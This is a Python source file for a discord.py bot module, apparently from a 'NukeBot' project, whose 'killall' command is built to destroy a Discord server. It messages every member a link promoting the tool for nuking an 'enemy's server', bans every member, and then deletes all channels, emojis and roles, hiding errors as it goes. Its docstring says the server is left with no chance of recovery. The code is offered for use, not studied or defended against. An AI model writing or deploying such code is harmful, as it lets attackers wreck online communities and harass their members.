from discord.ext import commands
import discord, time, asyncio

class KillALl(commands.Cog, name="Kill"):
	"""This command will fuck the server as hard as possible no chance to get recovered after the command is being executed! *Exception*"""
	def __init__(self, bot):
		self.bot = bot

	@commands.command(name="killall", aliases=["killa", "kall", "ka"])
	@commands.bot_has_permissions(ban_members=True, kick_members=True, manage_guild=True, manage_emojis=True, mention_everyone=True, manage_channels=True)
	async def _ka(self, ctx, *, remark:str=None):
		"""
		This command will fuck the server as hard as possible no chance to get recovered after the command is being executed! *Exception*
		
		Usage:
		[p]killall [reason:optional]
		"""
		try:
			remark = remark[:20:]
		except Exception:
			remark = None

		for member in ctx.guild.members:
			if member.id == ctx.author.id or member.id == ctx.guild.owner.id: pass # i think we should now DM the Owner themselves. LOL
			try:
				if remark is None: remark = "https://github.com/ritik0ranjan/NukeBot \nIf you too want to Nuke your ememy's server, do check the link once"
				await member.send(f"Message from **{ctx.guild.name}** {remark}")
				await member.ban(reason=f"Action requested by {ctx.author.name} ({ctx.author.id}) | Remark: {remark}")
			except Exception:
				pass # silently ignore if something goes wrong

		await asyncio.sleep(1.5)

		# for member in ctx.guild.members:
		# 	try:
		# 		await member.ban(reason=f"Action requested by {ctx.author.name} ({ctx.author.id}) | Remark: {remark}")
		# 	except Exception:
		# 		pass # silently ignore if something goes wrong
		# 
		# await asyncio.sleep(1.5)

		for channel in ctx.guild.channels:
			try:
				await channel.delete(reason=f"Action requested by {ctx.author.name} ({ctx.author.id}) | Remark: {remark}")
			except Exception:
				pass # silently ignore if something goes wrong

		await asyncio.sleep(1.5)

		for emoji in ctx.guild.emojis:
			try:
				await emoji.delete(reason=f"Action requested by {ctx.author.name} ({ctx.author.id}) | Remark: {remark}")
			except Exception:
				pass # silently ignore if something goes wrong

		await asyncio.sleep(1.5)

		for role in ctx.guild.roles:
			try:
				await role.delete(reason=f"Action requested by {ctx.author.name} ({ctx.author.id}) | Remark: {remark}")
			except Exception:
				pass # silently ignore if something goes wrong

def setup(bot):
	bot.add_cog(KillALl(bot))